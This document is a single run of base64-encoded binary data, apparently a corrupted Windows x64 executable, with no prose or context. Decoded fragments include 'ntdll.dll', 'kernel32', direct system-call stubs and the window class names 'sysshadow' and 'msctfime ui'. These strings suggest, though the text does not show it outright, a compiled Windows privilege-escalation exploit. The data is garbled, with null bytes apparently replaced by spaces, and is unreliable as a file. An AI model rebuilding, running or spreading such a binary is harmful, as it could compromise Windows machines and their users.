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h0E0YMSU4INCVGCHUQdgxXDFlWNlcMWQ5IawxGCEYMdAEIdV9eXVVTXRB1BDNFCMOZUFFRHCQMAXUEEn4JTQgFdQhbXVVVCFMzVlc5WiQPICAgTRRFDDEwAUAQAUUQORh1AjBGBAF0OAF0DwMPICAgRghADkYIDyAgIAJTUFJ6DEYMdTNsRgh0YmsMRgxTA1BSVQxGDHQDx4lGEF4IPkIgagEYUFIyyIMMdEUQORh1Agh1DEUYfRRBBAYBF3QDShAODzNAX8yLRCQITCQQCsiLTCQMdQlEJAQQIFPYi0QkCGQkFAPYi0QkCANbECAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAEgASAgICAgICAgIDAgYSAgICAgLyAgIC4gICBBIDogXCAgICAgICAwMTIzNDU2Nzg5YWJjZGVmICAgIC8TXTAZYDtQEmEwTE8+OzchWUghSzMULSUvCmEpISlAJUItSRUZWTUKEUZCUlkgAQIDBAUGIAgJF05JSBUgJgoKDAoODzAzQUQjVEspSEJTWhQSNlkkNk1QWzkcWF0TCgoMCg4PTyEjIiUVFVtVNUVVMCw/PyJhOk9VTzEtHkw1KF5NXUY4ORpBQlxNSUBGRyFCWi0sF1E9Gy8WUSQTVBtZMxEbMkgQKxJRHhouIWE8OThAFBNAPzUcHUI1LxdYVGEhPUYZEmJhQyRMTVhDFx8ZJixLXi1JKSMXGmMQXEdfJi9IYxA4XlMsTjlZVRcmSFVER0JKLiA1Qj8WU10uIC4gICAgICogICBcICAgICAgIFkFTFVTVlczZDUwICAgdgx2HEYIfiA2ZjlPGHV/DDN17I21ASAgASAgASAgIAIgIFBQUFlxPFwIGBUgICBZdyAgIFMQWANfXltdTCtzHHRedCQwQ3gsdFB8JDhAKANEJDRQBHQQdCQ8UAg7VCQ8dyEPMmZmIHQPZg8DMAN8JDABPgLZi8KLdCQ4VCQ0O3JTQ2B4CHRaA0cMdE8DUAEgIHQ9RCQw3oN/BCB1BQNfEAIDHwp0JCAgIHQFSiMETA4CUXQkNAEgIAME1oMUW1czM3QKPGF8AiwKA19WV1NRTCQ8cTxUAXh0XANUJDxaIAMkPEoYMwN0JDw7dCAEOEIYCnIkA3QkPFICICAgWgMzZgh6HDPSuwQgICADRCQ8A8eLIANEJDwCM1lbXsOLyK09dAh3ICAgICAgICB2RnoaICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICB4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeAMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICACICAgICAgAiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCCAgICAgICAgICAgICAgICAgQCAgQCAgICAgICAgeAMgICAgICAEICAgICAgICAgICAgICAgICBAICBCICAgICAgICAgICAgICAgICAgICAgICA/ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQFNIIGVIBCUgICBITEBYTAJlSAQlMCAgIEgCICBIOSB1A1MYSFNUSAEgIEggICBIASAgSCAgIEgBICBIICAgSAEgIEggICBISCBbASAgQFVTVldBVEFWQVdISEhMRUBFM0wzTHVASEx1UEx1QVcgDyAgIEx1WEFGAmVINCUwICAgTEVQRCRISUR0JEBFM8mJRCQ4SUh+KEhFWEhEJDBIXihITUBMdCQoTHQkIEFXMEh+KEhNQEFXSHg7SE1QQVdASFAwSFVIdCBBICAgTEVIVUlBVyhIVVBJQVc4QQEgICBBSEFfQV5BXF9eW11IXCQISGwkEEh0JBhXSCB5UCBJSEh9a0h0ZkhXQEgoSHQQRTNIBBlIQVABZUgEJSAgIEhIGEhxEEhIdB1IezAgdBZIS0hXEHQgSBtIO3Uz24FDaCBACCAgIGZDbEhcJDBIbCQ4SHQkQEggX0hcJBBMRCQYVVZXQVRBVkhIQEhISFFUSFcQRTNIICAgSM6LQQ9XEEUzQQ/GhXQJRXUEMxhISM+7ASAgICAPICAgSGVAIEhIdVcITE1AM2YDTEVmRTNmAmZFF0h9QCB0WnRWRXQGSF9uEEggICBFdQRIXUBIZTAgSEhdVwhMTTAzZgNMRWZFM2YCZkUXSFUwTEhhSFVATEhSSFwkeEhAQV5BXF9eXSAgICAgVVNWVw4FICAgX15baDMgIEFVTGVIBCUwICAgSAhASCBlSAQlICAgSEAYSEAwSEAQSMiLVQgkICAgVQxIAklBXTMzdCA8YXwCLCADUldWSEhyPEgzECAgIEgEEERAJEwDREgcTAPKi1ggSANEWBhBSgQwSAM7dCBBdQ9LDzRYQTxIBBcDSDNeX1ogICBIFVVTVldRSEhiAiAgQEggICBlSDwlICAgSH8YSH8wSFcQSHdASD9mfhggdUhrZXJuZWwzMnUFdDxhcwY8OXYCBCA6dUgIdUh6AiAgSGoCICABICBIIAQgIEhMJEhxPEhcCBhITCQjICAgSEwkICAgSEwkUxBIA0hiAiAgWUhIcxhIdHJIdCRASENweCx0Ykh8JDBAKEgDSEQkOFAESHQQSHQkKEhQCEg7VCQodygPMmZmIHQVZg84SANIA0h8JEBIAT5IAkhIdCQwSApUJDhIO3JMZCQITGwkEEhISENweAh0bUgDSEcMdEgDSGoCICBIdElMTH8EIHUIVxBMAwUXTANJDCRIdCdqAVrKhXQGIwVIVA4CSXICICBJBCRJCEgUSEhMbCQQTGQkCDMzdCA8YXwCLCADUldWSHI8SDMCICAgSAQCREAkTANESBxMA8qLWCBIA0RYGEFKBDBIAzt0IEF1D0sPNFhBPEgEOgNIM15fWsOtPXQgSCAgICAgICAgICAgICAgICAgICAgICAgIHZGehogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQgICAgICAgICABICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEQgIHggICAgICAgICAgICAgICAgICAgICAgICAgICAgTiAgJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7ICAgBCAgIDwgICAEICAgICAgICAgICAgICAgICAgICAgICAgIAEgICBAICAgAiAgIEAgICAgICAgICAgICAgIEAgIEAgICAgICAgIFIKICAgQiAgIAwgICBCICAgICAgICAgICAgICBAICBAICAgICAgICAkICAgIE4gICACICAgTiAgICAgICAgICAgICAgQCAgQiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNUQVRJQyAgICAgICAgICBHbG9iYWxcICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICACICAgICAgICkgASAgIFA/IAEgICADICAgICAgIHQnIAEgICBoPyABICAgICAgICAgICAqIAEgICBYPyABICAgKCAgICAgICArIAEgICBIPyABICAgICAKICAgICBELCABICAgQD8gASAgICAgDCAgICAgKyABICAgcD8gASAgIG50ZGxsLmRsbCAgICAgICBICUh/ICAgSCNIICAgICAgICAgICAgIFwgJSBTICAgXCAlIFMgICBzeXNzaGFkb3cgICAgICAgbXNjdGZpbWUgdWkgXCAgIFNDUk9MTEJBUiAgICAgICBcIEIgYSBzIGUgTiBhIG0gZSBkIE8gYiBqIGUgYyB0IHMgXCAlIFMgICAgICAgICBCICAgNCBQICA4ICBCICAgNCBQICA4ICBCICAgNCBQICBAICBCICAgNCBQICA4ICBCICAgNCBQICBAICBSICAgRCAgIDggIFIgICBEICAgQCAgEAIQEGIQEDAgAgJAIGggA0IgUCAQAhAQYhAQMCACAkAgaCADQiBQIBACEBBiEBAwIAICQCBoIEgDQiBQIBACEBBiEBAwIAICQCBoIANCIFAgEAIQEGIQEDAgAgJAIGggA0IgUCAQAhAQYhAQMCACAkAgaCADQiBQIBACEBBiEBAwIAICQCBoIEgDQiBQIBACEBBjEBAxIFgBQAEgaCBwA0IgUCAQAhAQYxAQMSBYAUABIGggcANCIFAgEAIQEGMQEDIgWAFAASBoIHADQiBQIBACEBBjEBAxIFgBQAEgaCBwA0IgUCAQAhAQYxAQMSBYAUABIGggcANCIFAgEAIQEGMQEDIgWAFAASBoIHADQiBQIBACEH8QYxAQMiBYAUABIHAgA0EgTiAQAhB/EGMQEDIgWAFAASBwIANBIE4gEAIQfxBjEBAyIFgBQAEgcCADQSBOIBADEH8QYxAQNCBQATgBICADQyBQIBADEH8QYxAQNCBQATgBICADQyBQIBAEEBBkEB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